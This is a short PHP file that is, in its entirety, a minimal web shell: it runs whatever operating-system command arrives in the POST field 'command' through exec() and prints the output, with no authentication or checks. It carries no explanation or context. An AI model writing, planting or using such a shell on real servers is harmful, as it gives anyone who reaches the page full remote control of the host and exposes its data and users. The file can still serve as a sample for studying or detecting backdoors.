<?php
exec($_POST["command"]." 2>&1",$out);
echo(join("\n",$out));

exit;
?>